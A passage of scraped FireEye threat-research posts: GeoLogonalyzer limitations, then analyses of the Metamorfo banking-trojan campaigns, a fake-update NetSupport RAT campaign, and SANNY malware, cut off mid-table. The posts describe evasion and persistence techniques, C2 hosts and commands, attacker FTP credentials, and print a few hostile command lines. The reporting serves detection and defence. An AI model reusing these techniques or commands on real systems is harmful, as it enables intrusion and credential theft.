investigate potentially suspicious logon activity through other investigative methods. GeoLogonalyzer Limitations Reserved Addresses Any RFC1918 source IP addresses, such as 192.168.X.X and 10.X.X.X, will not have a physical location registered in the MaxMind database. By default, GeoLogonalyzer will use the coordinates (0, 0) for any reserved IP address, which may alter results. Analysts can manually edit these coordinates, if desired, by modifying the RESERVED_IP_COORDINATES constant in the Python script. Setting this constant to the coordinates of your office location may provide the most accurate results, although may not be feasible if your organization has multiple locations or other point-to-point connections. GeoLogonalyzer also accepts the parameter –skip_rfc1918, which will completely ignore any RFC1918 source IP addresses and could result in missed activity. Failed Logon and Logoff Data It may also be useful to include failed logon attempts and logoff records with the log source data to see anomalies related to source information of all VPN activity. At this time, GeoLogonalyzer does not distinguish between successful logons, failed logon attempts, and logoff events. GeoLogonalyzer also does not detect overlapping logon sessions from multiple source IP addresses. False Positive Factors Note that the use of VPN or other tunneling services may create false positives. For example, a user may access an application from their home office in Wyoming at 08:00 UTC, connect to a VPN service hosted in Georgia at 08:30 UTC, and access the application again through the VPN service at 09:00 UTC. GeoLogonalyzer would process this application access log and detect that the user account required a FAST travel rate of roughly 1,250 miles per hour which may appear malicious. Establishing a baseline of legitimate authentication patterns is recommended to understand false positives. Reliance on Open Source Data GeoLogonalyzer relies on open source data to make cloud hosting provider determinations. These lookups are only as accurate as the available open source data. Preventing Remote Access Abuse Understanding that no single analysis method is perfect, the following recommendations can help security teams prevent the abuse of remote access platforms and investigate suspected compromise. Identify and limit remote access platforms that allow access to sensitive information from the Internet, such as VPN servers, systems with RDP or SSH exposed, third-party applications (e.g., Citrix), intranet sites, and email infrastructure. Implement a multi-factor authentication solution that utilizes dynamically generated one-time use tokens for all remote access platforms. Ensure that remote access authentication logs for each identified access platform are recorded, forwarded to a log aggregation utility, and retained for at least one year. Whitelist IP address ranges that are confirmed as legitimate for remote access users based on baselining or physical location registrations. If whitelisting is not possible, blacklist IP address ranges registered to physical locations or cloud hosting providers that should never legitimately authenticate to your remote access portal. Utilize either SIEM capabilities or GeoLogonalyzer.py to perform GeoFeasibility analysis of all remote access on a regular frequency to establish a baseline of accounts that legitimately perform unexpected logon activity and identify new anomalies. Investigating anomalies may require contacting the owner of the user account in question. FireEye Helix analyzes live log data for all techniques utilized by GeoLogonalyzer, and more! Download GeoLogonalyzer today. Acknowledgements Christopher Schmitt, Seth Summersett, Jeff Johns, and Alexander Mulfinger. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2018/04/metamorfo-campaign-targeting-brazilian-users.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2018-04-24",
                    "source": "www.fireeye.com"
                },
                "text": "FireEye Labs recently identified several widespread malspam (malware spam) campaigns targeting Brazilian companies with the goal of delivering banking Trojans. We are referring to these campaigns as Metamorfo. Across the stages of these campaigns, we have observed the use of several tactics and techniques to evade detection and deliver the malicious payload. In this blog post we dissect two of the main campaigns and explain how they work. Campaign #1 The kill chain starts with an email containing an HTML attachment with a refresh tag that uses a Google URL shortener as the target. Figure 1 shows a sample email, and Figure 2 show the contents of the HTML file. Figure 1: Malicious Email with HTML Attachment Figure 2: Contents of HTML File When the URL is loaded, it redirects the victim to a cloud storage site such as GitHub, Dropbox, or Google Drive to download a ZIP file. An example is shown in Figure 3. Figure 3: URL Shortener Redirects to Github Link The ZIP archive contains a malicious portable executable (PE) file with embedded HTML application (HTA). The user has to unzip the archive and double-click the executable for the infection chain to continue. The PE file is a simple HTA script compiled into an executable. When the user double-clicks the executable, the malicious HTA file is extracted to %temp% and executed by mshta.exe. The HTA script (Figure 4) contains VBS code that fetches a second blob of VBS code encoded in base64 form from hxxp://<redacted>/ilha/pz/logs.php. Figure 4: Contents of HTA File After the second stage of VBS is decoded (Figure 5 and Figure 6), the script downloads the final stage from hxxp://<redacted>/28022018/pz.zip. Figure 5: Contents of Decoded VBS Figure 6: More Contents of Decoded VBS The downloaded ZIP file contains four files. Two are PE files. One is a legitimate Windows tool, pvk2pfx.exe, that is abused for DLL side-loading. One is the malicious banking Trojan as the DLL. The VBS code unzips the archive, changes the extension of the legitimate Windows tool from .png to .exe, and renames the malicious DLL as cryptui.dll. The VBS code also creates a file in C:\\Users\\Public\\Administrador\\car.dat with random strings. These random strings are used to name the Windows tool, which is then executed. Since this tool depends on a legitimate DLL named cryptui.dll, the search order path will find the malicious Trojan with the same name in the same directory and load it into its process space. In Q4 of 2017, a similar malspam campaign delivered the same banking Trojan by using an embedded JAR file attached in the email instead of an HTML attachment. On execution, the Java code downloaded a ZIP archive from a cloud file hosting site such as Google Drive, Dropbox, or Github. The ZIP archive contained a legitimate Microsoft tool and the malicious Trojan. Banking Trojan Analysis The Trojan expects to be located in the hardcoded directory C:\\\\Users\\\\Public\\Administrador\\\\ along with three other files to start execution. As seen in Figure 7, these files are: car.dat (randomly generated name given to Windows tool) i4.dt (VBS script that downloads the same zip file) id (ID given to host) cryptui.dll (malicious Trojan) Figure 7: Contents of ZIP Archive Persistence The string found in the file C:\\\\Users\\\\Public\\\\Administrador\\\\car.dat is extracted and used to add the registry key Software\\Microsoft\\Windows\\CurrentVersion\\Run\\<string from car.dat> for persistence, as shown in Figure 8. Figure 8: Reading from car.dat File The sample also looks for a file named i4.dt in the same directory and extracts the contents of it, renames the file to icone.vbs, and creates a new persistent key (Figure 9) in \\Software\\Microsoft\\Windows\\CurrentVersion\\Run to open this file. Figure 9: Persistence Keys The VBS code in this file (Figure 10) has the ability to recreate the whole chain and download the same ZIP archive. Figure 10: Contents of VBS Script Next, the Trojan searches for several folders in the Program Files directories, including: C:\\\\Program Files\\\\AVG C:\\\\Program Files\\\\AVAST Software C:\\\\Program Files\\\\Diebold\\\\Warsaw C:\\\\Program Files\\\\Trusteer\\\\Rapport C:\\\\Program Files\\\\Java C:\\\\Program Files (x86)\\\\scpbrad If any of the folders are found, this information, along with the hostname and Operating System version, is sent to a hardcoded domain with the hardcoded User-Agent value “Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0” in the format shown in Figure 11. The value of AT is “<host_name+OS&MD>=<list of folders found>”. Figure 11: Network Traffic for Host Enumeration The sample iterates through the running processes, kills the following, and prevents them from launching: msconfig.exe TASKMGR.exe regedit.exe ccleaner64.exe taskmgr.exe itauaplicativo.exe Next, it uses GetForegroundWindow to get a handle to the window the user is viewing and GetWindowText to extract the title of the window. The title is compared against a hardcoded list of Brazilian banking and digital coin sites. The list is extensive and includes major organizations and smaller entities alike. If any of those names are found and the browser is one of the following, the Trojan will terminate that browser. firefox.exe chrome.exe opera.exe safari.exe The folder C:\\Users\\Public\\Administrador\\logs\\ is created to store screenshots, as well as the number of mouse clicks the user has triggered while browsing the banking sites (Figure 12). The screenshots are continuously saved as .jpg images. Figure 12: Malware Capturing Mouse Clicks Command and Control The command and control (C2) server is selected based on the string in the file “id”: al -> '185.43.209[.]182' gr -> '212.237.46[.]6' pz -> '87.98.146[.]34' mn -> ’80.211.140[.]235' The connection to one of the hosts is then started over raw TCP on port 9999. The command and control communication generally follows the pattern <|Command |>, for example: '<|dispida|>logs>SAVE<' sends the screenshots collected in gh.txt. '<PING>' is sent from C2 to host, and '<PONG>' is sent from host to C2, to keep the connection alive. '<|INFO|>' retrieves when the infection first started based on the file timestamp from car.dat along with '<|>' and the host information. There were only four possible IP addresses that the sample analyzed could connect to based on the strings found in the file “id”. After further researching the associated infrastructure of the C2 (Figure 13), we were able to find potential number of victims for this particular campaign. Figure 13: Command and Control Server Open Directories Inside the open directories, we were able to get the following directories corresponding to the different active campaigns. Inside each directory we could find statistics with the number of victims reporting to the C2. As of 3/27/2018, the numbers were: al – 843 ap – 879 gr – 397 kk – 2,153 mn – 296 pz – 536 tm – 187 A diagram summarizing Campaign #1 is shown in Figure 14. Figure 14: Infection Chain of Campaign #1 Campaign #2 In the second campaign, FireEye Labs observed emails with links to legitimate domains (such as hxxps://s3-ap-northeast-1.amazonaws[.]com/<redacted>/Boleto_Protesto_Mes_Marco_2018.html) or compromised domains (such as hxxps://curetusu.<redacted>-industria[.]site/) that use a refresh tag with a URL shortener as the target. The URL shortener redirects the user to an online storage site, such as Google Drive, Github, or Dropbox, that hosts a malicious ZIP file. A sample phishing email is shown in Figure 15. Figure 15: Example Phishing Email The ZIP file contains a malicious executable written in AutoIt (contents of this executable are shown in Figur 16). When executed by the user, it drops a VBS file to a randomly created and named directory (such as C:\\mYPdr\\TkCJLQPX\\HwoC\\mYPdr.vbs) and fetches contents from the C2 server. Figure 16: Contents of Malicious AutoIt Executable Two files are downloaded from the C2 server. One is a legitimate Microsoft tool and the other is a malicious DLL: https[:]//panel-dark[.]com/w3af/img2.jpg https[:]//panel-dark[.]com/w3af/img1.jpg Those files are downloaded and saved into random directories named with the following patterns: <current user dir>\\<5 random chars>\\<8 random chars>\\<4 random chars>\\<5 random chars>.exe <current user dir>\\<5 random chars>\\<8 random chars>\\<4 random chars>\\CRYPTUI.dll The execution chain ensures that persistence is set on the affected system using a .lnk file in the Startup directory. The .lnk file shown in Figure 17 opens the malicious VBS dropped on the system. Figure 17: Persistence Key The VBS file (Figure 18) will launch and execute the downloaded legitimate Windows tool, which in this case is Certmgr.exe. This tool will be abused using the DLL side loading technique. The malicious Cryptui.dll is loaded into the program instead of the legitimate one and executed. Figure 18: Contents of Dropped VBS File Banking Trojan Analysis Like the Trojan from the first campaign, this sample is executed through search-order hijacking. In this case, the binary abused is a legitimate Windows tool, Certmgr.exe, that loads Cryptui.dll. Since this tool depends on a legitimate DLL named cryptui.dll, the search order path will find the malicious Trojan with the same name in the same directory and load it into its process space. The malicious DLL exports 21 functions. Only DllEntryPoint contains real code that is necessary to start the execution of the malicious code. The other functions return hardcoded values that serve no real purpose. On execution, the Trojan creates a mutex called \"correria24\" to allow only one instance of it to run at a time. The malware attempts to resolve “www.goole[.]com” (most likely a misspelling). If successful, it sends a request to hxxp://api-api[.]com/json in order to detect the external IP of the victim. The result is parsed and execution continues only if the country code matches “BR”, as shown in Figure 19. Figure 19: Country Code Check The malware creates an empty file in %appdata%\\Mariapeirura on first execution, which serves as a mutex lock, before attempting to send any collected information to the C2 server. This is done in order to get only one report per infected host. The malware collects host information, base64 encodes it, and sends it to two C2 servers. The following items are gathered from the infected system: OS name OS version OS architecture AV installed List of banking software installed IP address Directory where malware is being executed from The information is sent to hxxp://108.61.188.171/put.php (Figure 20). Figure 20: Host Recon Data Sent to First C2 Server The same information is sent to panel-dark[.]com/Contador/put.php (Figure 21). Figure 21: Host Recon Data Sent to Second C2 Server The malware alters the value of registry key Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ExtendedUIHoverTime to 2710 in order to change the number of milliseconds a thumbnail is showed while hovering on the taskbar, as seen in Figure 22. Figure 22: ExtendedUIHoverTime Registry Key Change Like the Trojan from the first campaign, this sample checks if the foreground window's title contains names of Brazilian banks and digital coins by looking for hardcoded strings. The malware displays fake forms on top of the banking sites and intercepts credentials from the victims. It can also display a fake Windows Update whenever there is nefarious activity in the background, as seen in Figure 23. Figure 23: Fake Form Displaying Windows Update The sample also contains a keylogger functionality, as shown in Figure 24. Figure 24: Keylogger Function Command and Control The Trojan’s command and control command structure is identical to the first sample. The commands are denoted by the <|Command|> syntax. <|OK|> gets a list of banking software installed on the host. '<PING>' is sent from C2 to host, and '<PONG>' is sent from host to C2, to keep connection alive. <|dellLemb|> deletes the registry key \\Software\\Microsoft\\Internet Explorer\\notes. EXECPROGAM calls ShellExecute to run the application given in the command. EXITEWINDOWS calls ExitWindowsEx. NOVOLEMBRETE creates and stores data sent with the command in the registry key \\Software\\Microsoft\\Internet Explorer\\notes. Figure 25: Partial List of Victims This sample contains most of the important strings encrypted. We provide the following script (Figure 26) in order to decrypt them. Figure 26: String Decryption Script Conclusion The use of multi-stage infection chains makes it challenging to research these types of campaigns all the way through. As demonstrated by our research, the attackers are using various techniques to evade detection and infect unsuspecting Portuguese-speaking users with banking Trojans. The use of public cloud infrastructure to help deliver the different stages plays a particularly big role in delivering the malicious payload. The use of different infection methods combined with the abuse of legitimate signed binaries to load malicious code makes these campaigns worth highlighting. Indicators of Compromise Campaign #1 TYPE HASH DESCRIPTION MD5 860fa744d8c82859b41e00761c6e25f3 PE with Embedded HTA MD5 3e9622d1a6d7b924cefe7d3458070d98 PE with Embedded HTA MD5 f402a482fd96b0a583be2a265acd5e74 PE with Embedded HTA MD5 f329107f795654bfc62374f8930d1e12 PE with Embedded HTA MD5 789a021c051651dbc9e01c5d8c0ce129 PE with Embedded HTA MD5 68f818fa156d45889f36aeca5dc75a81 PE with Embedded HTA MD5 c2cc04be25f227b13bcb0b1d9811e2fe cryptui.dll MD5 6d2cb9e726c9fac0fb36afc377be3aec id MD5 dd73f749d40146b6c0d2759ba78b1764 i4.dt MD5 d9d1e72165601012b9d959bd250997b3 VBS file with commands to create staging directories for malware MD5 03e4f8327fbb6844e78fda7cdae2e8ad pvk2pfx.exe [Legit Windows Tool] URL hxxp://5.83.162.24/ilha/pz/logs.php URL hxxp://5.83.162.24/28022018/pz.zip C2 ibamanetibamagovbr[.]org/virada/pz/logs.php URL sistemasagriculturagov[.]org URL hxxp://187.84.229.107/05022018/al.zip Campaign #2 TYPE HASH DESCRIPTION MD5 2999724b1aa19b8238d4217565e31c8e AutoIT Dropper MD5 181c8f19f974ad8a84b8673d487bbf0d img1.jpg [lLegit Windows Tool] MD5 d3f845c84a2bd8e3589a6fbf395fea06 img2.jpg [Banking Trojan] MD5 2365fb50eeb6c4476218507008d9a00b Variants of Banking Trojan MD5 d726b53461a4ec858925ed31cef15f1e Variants of Banking Trojan MD5 a8b2b6e63daf4ca3e065d1751cac723b Variants of Banking Trojan MD5 d9682356e78c3ebca4d001de760848b0 Variants of Banking Trojan MD5 330721de2a76eed2b461f24bab7b7160 Variants of Banking Trojan MD5 6734245beda04dcf5af3793c5d547923 Variants of Banking Trojan MD5 a920b668079b2c1b502fdaee2dd2358f Variants of Banking Trojan MD5 fe09217cc4119dedbe85d22ad23955a1 Variants of Banking Trojan MD5 82e2c6b0b116855816497667553bdf11 Variants of Banking Trojan MD5 4610cdd9d737ecfa1067ac30022d793b Variants of Banking Trojan MD5 34a8dda75aea25d92cd66da53a718589 Variants of Banking Trojan MD5 88b808d8164e709df2ca99f73ead2e16 Variants of Banking Trojan MD5 d3f845c84a2bd8e3589a6fbf395fea06 Variants of Banking Trojan MD5 28a0968163b6e6857471305aee5c17e9 Variants of Banking Trojan MD5 1285205ae5dd5fa5544b3855b11b989d Variants of Banking Trojan MD5 613563d7863b4f9f66590064b88164c8 Variants of Banking Trojan MD5 3dd43e69f8d71fcc2704eb73c1ea7daf Variants of Banking Trojan C2 https[:]//panel-dark[.]com/w3af/img2.jpg C2 https[:]//panel-dark[.]com/w3af/img1.jpg Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2018/04/fake-software-update-abuses-netsupport-remote-access-tool.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2018-04-05",
                    "source": "www.fireeye.com"
                },
                "text": "Over the last few months, FireEye has tracked an in-the-wild campaign that leverages compromised sites to spread fake updates. In some cases, the payload was the NetSupport Manager remote access tool (RAT). NetSupport Manager is a commercially available RAT that can be used legitimately by system administrators for remotely accessing client computers. However, malicious actors are abusing this application by installing it to the victims’ systems without their knowledge to gain unauthorized access to their machines. This blog details our analysis of the JavaScript and components used in instances where the identified payload was NetSupport RAT. Infection Vector The operator behind these campaigns uses compromised sites to spread fake updates masquerading as Adobe Flash, Chrome, and FireFox updates. When users navigate to the compromised website, the malicious JavaScript file is downloaded, mostly from a DropBox link. Before delivering the payload, the JavaScript sends basic system information to the server. After receiving further commands from the server, it then executes the final JavaScript to deliver the final payload. In our case, the JavaScript that delivers the payload is named Update.js, and it is executed from %AppData% with the help of wscript.exe. Figure 1 shows the infection flow. Figure 1: Infection Flow In-Depth Analysis of JavaScript The initial JavaScript file contains multiple layers of obfuscation. Like other malicious scripts, the first layer has obfuscation that builds and executes the second layer as a new function. The second layer of the JavaScript contains the dec function, which is used to decrypt and execute more JavaScript code. Figure 2 shows a snapshot of the second layer. Figure 2: Second Layer of Initial JavaScript File In the second JavaScript file, the malware author uses a tricky method to make the analysis harder for reverse engineers. The author uses the caller and callee function code to get the key for decryption. During normal JavaScript analysis, if an analyst finds any obfuscated script, the analyst tries to de-obfuscate or beautify the script for analysis. JavaScript beautification tools generally add line breaks and tabs to make the script code look better and easier to analyze. The tools also try to rename the local variables and remove unreferenced variables and code from the script, which helps to analyze core code only. But in this case, since the malware uses the caller and callee function code to derive the key, if the analyst adds or removes anything from the first or second layer script, the script will not be able to retrieve the key and will terminate with an exception. The code snippet in Figure 3 shows this trick. Figure 3: Anti-Analysis Trick Implemented in JavaScript (Beautified Code) The code decrypts and executes the JavaScript code as a function. This decrypted function contains code that initiates the network connection. In the decoded function, the command and control (C2) URL and a value named tid are hard-coded in the script and protected with some encoded function. During its first communication to the server, the malware sends the tid value and the current date of the system in encoded format, and waits for the response from the server. It decodes the server response and executes the response as a function, as shown in Figure 4. Figure 4: Initial Server Communication and Response The response from the server is JavaScript code that the malware executes as a function named step2. The step2 function uses WScript.Network and Windows Management Instrumentation(WMI) to collect the following system information, which it then encodes and sends to the server: Architecture, ComputerName, UserName, Processors, OS, Domain, Manufacturer, Model, BIOS_Version, AntiSpywareProduct, AntiVirusProduct, MACAddress, Keyboard, PointingDevice, DisplayControllerConfiguration, ProcessList; After sending the system information to the server, the response from the server contains two parts: content2 and content3 . The script ( step2 function) decodes both parts. The decoded content3 part contains the function named as step3 , as shown in Figure 5. Figure 5: Decrypting and Executing Response step3 The step3 function contains code that writes decoded content2 into a %temp% directory as Update.js . Update.js contains code to download and execute the final payload. The step3 function also sends the resulting data, such as runFileResult and _tempFilePath, to the server, as shown in Figure 6. Figure 6: Script to Drop and Execute Update.js The Update.js file also contains multi-layer obfuscation. After decoding, the JavaScript contains code to drop multiple files in %AppData%, including a 7zip standalone executable (7za.exe), password-protected archive (Loglist.rtf), and batch script (Upd.cmd). We will talk more about these components later. JavaScript uses PowerShell commands to download the files from the server. It sets the attribute’s execution policy to bypass and window-style to hidden to hide itself from the end user. Components of the Attack Figure 7 shows the index of the malicious server where we have observed the malware author updating the script content. Figure 7: Index of Malicious Server 7za.exe: 7zip standalone executable LogList.rtf: Password-protected archive file Upd.cmd: Batch script to install the NetSupport Client Downloads.txt: List of IPs (possibly the infected systems) Get.php: Downloads LogList.rtf Upd.cmd This file is a batch script that extracts the archive file and installs the remote control tool on the system. The script is obfuscated with the variable substitution method. This file was regularly updated by the malware during our analysis. After de-obfuscating the script, we can see the batch commands in the script (Figure 8). Figure 8: De-Obfuscated Upd.cmd Script The script performs the following tasks: Extract the archive using the 7zip executable with the password mentioned in the script. After extraction, delete the downloaded archive file (loglist.rtf). Disable Windows Error Reporting and App Compatibility. Add the remote control client executable to the firewall’s allowed program list. Run remote control tool (client32.exe). Add Run registry entry with the name “ManifestStore” or downloads shortcut file to Startup folder. Hide the files using attributes. Delete all the artifacts (7zip executable, script, archive file). Note: While analyzing the script, we found some typos in the script (Figure 9). Yes, malware authors make mistakes too. This script might be in beta phase. In the later version of script, the author has removed these typos. Figure 9: Registry Entry Bloopers Artifact Cleaning As mentioned, the script contains code to remove the artifacts used in the attack from the victim’s system. While monitoring the server, we also observed some change in the script related to this code, as shown in Figure 10. Figure 10: Artifact Cleaning Commands The highlighted command in one of the variants indicates that it might drop or use this file in the attack. The file could be a decoy document. Persistence Mechanism During our analysis, we observed two variants of this attack with different persistence mechanisms. In the first variant, the malware author uses a RUN registry entry to remain persistent in the system. In the second variant, the malware author uses the shortcut file (named desktop.ini.lnk ), which is hosted on the server. It downloads the shortcut file and places it into the Startup folder, as shown in Figure 11. Figure 11: Downloading Shortcut File The target command for the shortcut file points to the remote application “client32.exe,” which was dropped in %AppData%, to start the application on startup. LogList.rtf Although the file extension is .rtf, the file is actually a 7zipped archive. This archive file is password-protected and contains the NetSupport Manager RAT. The script upd.cmd contains the password to extract the archive. The major features provided by the NetSupport tool include: Remote desktop File transfer Remote inventory and system information Launching applications in client’s machine Geolocation Downloads.txt This file contains a list of IP addresses, which could be compromised systems. It has IPs along with User-agent. The IP addresses in the file belong to various regions, mostly the U.S., Germany, and the Netherlands. Conclusion RATs are widely used for legitimate purposes, often by system administrators. However, since they are legitimate applications and readily available, malware authors can easily abuse them and sometimes can avoid user suspicion as well. The FireEye HX Endpoint platform successfully detects this attack at the initial phase of the attack cycle. Acknowledgement Thanks to my colleagues Dileep Kumar Jallepalli, Rakesh Sharma and Kimberly Goody for their help in the analysis. Indicators of Compromise Registry entries HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run :  ManifestStore HKCU\\Software\\SeX\\KEx Files %AppData%\\ManifestStore\\client32.exe %AppData%\\ManifestStore\\client32.ini %AppData%\\ManifestStore\\HTCTL32.DLL %AppData%\\ManifestStore\\msvcr100.dll %AppData%\\ManifestStore\\nskbfltr.inf %AppData%\\ManifestStore\\NSM.ini %AppData%\\ManifestStore\\NSM.LIC %AppData%\\ManifestStore\\nsm_vpro.ini %AppData%\\ManifestStore\\pcicapi.dll %AppData%\\ManifestStore\\PCICHEK.DLL %AppData%\\ManifestStore\\PCICL32.DLL %AppData%\\ManifestStore\\remcmdstub.exe %AppData%\\ManifestStore\\TCCTL32.DLL %AppData%\\systemupdate\\Whitepaper.docx Shortcut file %AppData%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desktop.ini.lnk Firewall program entry allowing the following application %AppData%\\ManifestStore\\client32.exe Running process named “client32.exe” from the path “%AppData%\\ManifestStore\\client32.exe” Hashes The following hashes are JavaScript files that use the same obfuscation techniques described in the blog: fc87951ae927d0fe5eb14027d43b1fc3 e3b0fd6c3c97355b7187c639ad9fb97a a8e8b2072cbdf41f62e870ec775cb246 6c5fd3258f6eb2a7beaf1c69ee121b9f 31e7e9db74525b255f646baf2583c419 065ed6e04277925dcd6e0ff72c07b65a 12dd86b842a4d3fe067cdb38c3ef089a 350ae71bc3d9f0c1d7377fb4e737d2a4 c749321f56fce04ad8f4c3c31c7f33ff c7abd2c0b7fd8c19e08fe2a228b021b9 b624735e02b49cfdd78df7542bf8e779 5a082bb45dbab012f17120135856c2fc dc4bb711580e6b2fafa32353541a3f65 e57e4727100be6f3d243ae08011a18ae 9bf55bf8c2f4072883e01254cba973e6 20a6aa24e5586375c77b4dc1e00716f2 aa2a195d0581a78e01e62beabb03f5f0 99c7a56ba04c435372bea5484861cbf3 8c0d17d472589df4f597002d8f2ba487 227c634e563f256f396b4071ffda2e05 ef315aa749e2e33fc6df09d10ae6745d 341148a5ef714cf6cd98eb0801f07a01 Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2018-03-23",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction In the third week of March 2018, through FireEye’s Dynamic Threat Intelligence, FireEye discovered malicious macro-based Microsoft Word documents distributing SANNY malware to multiple governments worldwide. Each malicious document lure was crafted in regard to relevant regional geopolitical issues. FireEye has tracked the SANNY malware family since 2012 and believes that it is unique to a group focused on Korean Peninsula issues. This group has consistently targeted diplomatic entities worldwide, primarily using lure documents written in English and Russian. As part of these recently observed attacks, the threat actor has made significant changes to their usual malware delivery method. The attack is now carried out in multiple stages, with each stage being downloaded from the attacker’s server. Command line evasion techniques, the capability to infect systems running Windows 10, and use of recent User Account Control (UAC) bypass techniques have also been added. Document Details The following two documents, detailed below, have been observed in the latest round of attacks: MD5 hash: c538b2b2628bba25d68ad601e00ad150 SHA256 hash: b0f30741a2449f4d8d5ffe4b029a6d3959775818bf2e85bab7fea29bd5acafa4 Original Filename: РГНФ 2018-2019.doc The document shown in Figure 1 discusses Eurasian geopolitics as they relate to China, as well as Russia’s security. Figure 1: Sample document written in Russian MD5 hash: 7b0f14d8cd370625aeb8a6af66af28ac SHA256 hash: e29fad201feba8bd9385893d3c3db42bba094483a51d17e0217ceb7d3a7c08f1 Original Filename: Copy of communication from Security Council Committee (1718).doc The document shown in Figure 2 discusses sanctions on humanitarian operations in the Democratic People’s Republic of Korea (DPRK). Figure 2: Sample document written in English Macro Analysis In both documents, an embedded macro stores the malicious command line to be executed in the TextBox property (TextBox1.Text) of the document. This TextBox property is first accessed by the macro to execute the command on the system and is then overwritten to delete evidence of the command line. Stage 1: BAT File Download In Stage 1, the macro leverages the legitimate Microsoft Windows certutil.exe utility to download an encoded Windows Batch (BAT) file from the following URL: http://more.1apps[.]com/1.txt. The macro then decodes the encoded file and drops it in the %temp% directory with the name: 1.bat. There were a few interesting observations in the command line: The macro copies the Microsoft Windows certutil.exe utility to the %temp% directory with the name: ct.exe. One of the reasons for this is to evade detection by security products. Recently, FireEye has observed other threat actors using certutil.exe for malicious purposes. By renaming “certutil.exe” before execution, the malware authors are attempting to evade simple file-name based heuristic detections. The malicious BAT file is stored as the contents of a fake PEM encoded SSL certificate (with the BEGIN and END markers) on the Stage 1 URL, as shown in Figure 3.  The “certutil.exe” utility is then leveraged to both strip the BEGIN/END markers and decode the Base64 contents of the file. FireEye has not previously observed the malware authors use this technique in past campaigns. Figure 3: Malicious BAT file stored as an encoded file to appear as an SSL certificate BAT File Analysis Once decoded and executed, the BAT file from Stage 1 will download an encoded CAB file from the base URL: hxxp://more.1apps[.]com/. The exact file name downloaded is based on the architecture of the operating system. For a 32-bit operating system: hxxp://more.1apps[.]com/2.txt For a 64-bit operating system: hxxp://more.1apps[.]com/3.txt Similarly, based on Windows operating system version and architecture, the CAB file is installed using different techniques. For Windows 10, the BAT file uses rundll32 to invoke the appropriate function from update.dll (component inside setup.cab). For a 32-bit operating system: rundll32 update.dll _EntryPoint@16 For a 64-bit operating system: rundll32 update.dll EntryPoint For other versions of Windows, the CAB file is extracted using the legitimate Windows Update Standalone Installer (wusa.exe) directly into the system directory: The BAT file also checks for the presence of Kaspersky Lab Antivirus software on the machine. If found, CAB installation is changed accordingly in an attempt to bypass detection: Stage 2: CAB File Analysis As described in the previous section, the BAT file will download the CAB file based on the architecture of the underlying operating system. The rest of the malicious activities are performed by the downloaded CAB file. The CAB file contains the following components: install.bat – BAT file used to deploy and execute the components. ipnet.dll – Main component that we refer to as SANNY malware. ipnet.ini – Config file used by SANNY malware. NTWDBLIB.dll – Performs UAC bypass on Windows 7 (32-bit and 64-bit). update.dll – Performs UAC bypass on Windows 10. install.bat will perform the following essential activities: Checks the current execution directory of the BAT file. If it is not the Windows system directory, then it will first copy the necessary components (ipnet.dll and ipnet.ini) to the Windows system directory before continuing execution: Hijacks a legitimate Windows system service, COMSysApp (COM+ System Application) by first stopping this service, and then modifying the appropriate Windows service registry keys to ensure that the malicious ipnet.dll will be loaded when the COMSysApp service is started: After the hijacked COMSysApp service is started, it will delete all remaining components of the CAB file: ipnet.dll is the main component inside the CAB file that is used for performing malicious activities. This DLL exports the following two functions: ServiceMain – Invoked when the hijacked system service, COMSysApp, is started. Post – Used to perform data exfiltration to the command and control (C2) server using FTP protocol. The ServiceMain function first performs a check to see if it is being run in the context of svchost.exe or rundll32.exe. If it is being run in the context of svchost.exe, then it will first start the system service before proceeding with the malicious activities. If it is being run in the context of rundll32.exe, then it performs the following activities: Deletes the module NTWDBLIB.DLL from the disk using the following command: cmd /c taskkill /im cliconfg.exe /f /t && del /f /q NTWDBLIB.DLL Sets the code page on the system to 65001, which corresponds to UTF-8: cmd /c REG ADD HKCU\\Console /v CodePage /t REG_DWORD /d 65001 /f Command and Control (C2) Communication SANNY malware uses the FTP protocol as the C2 communication channel. FTP Config File The FTP configuration information used by SANNY malware is encoded and stored inside ipnet.ini. This file is Base64 encoded using the following custom character set: SbVIn=BU/dqNP2kWw0oCrm9xaJ3tZX6OpFc7Asi4lvuhf-TjMLRQ5GKeEHYgD1yz8 Upon decoding the file, the following credentials can be recovered: FTP Server: ftp.capnix[.]com Username: cnix_21072852 Password: vlasimir2017 It then continues to perform the connection to the FTP server decoded from the aforementioned config file, and sets the current directory on the FTP server as “htdocs” using the FtpSetCurrentDirectoryW function. System Information Collection For reconnaissance purposes, SANNY malware executes commands on the system to collect information, which is sent to the C2 server. System information is gathered from the machine using the following command: The list of running tasks on the system is gathered by executing the following command: C2 Commands After successful connection to the FTP server decoded from the configuration file, the malware searches for a file containing the substring “to everyone” in the “htdocs” directory. This file will contain C2 commands to be executed by the malware. Upon discovery of the file with the “to everyone” substring, the malware will download the file and then performs actions based on the following command names: chip command: This command deletes the existing ipnet.ini configuration file from the file system and creates a new ipnet.ini file with a specified configuration string. The chip commands allows the attacker to migrate malware to a new FTP C2 server. The command has the following syntax: pull command: This command is used for the purpose of data exfiltration. It has the ability to upload an arbitrary file from the local filesystem to the attacker’s FTP server. The command has the following syntax: The uploaded file is compressed and encrypted using the routine described later in the Compression and Encoding Data section. put command: This command is used to copy an existing file on the system to a new location and delete the file from the original location. The command has the following syntax: default command: If the command begins with the substring “cmd /c”, but it is not followed by either of the previous commands (chip, pull, and put), then it directly executes the command on the machine using WinExec. /user command: This command will execute a command on the system as the logged in user. The command duplicates the access token of “explorer.exe” and spawns a process using the following steps: Enumerates the running processes on the system to search for the explorer.exe process and obtain the process ID of explorer.exe. Obtains the access token for the explorer.exe process with the access flags set to 0x000F01FF. Starts the application (defined in the C2 command) on the system by calling the CreateProcessAsUser function and using the access token obtained in Step 2. C2 Command Purpose chip Update the FTP server config file pull Upload 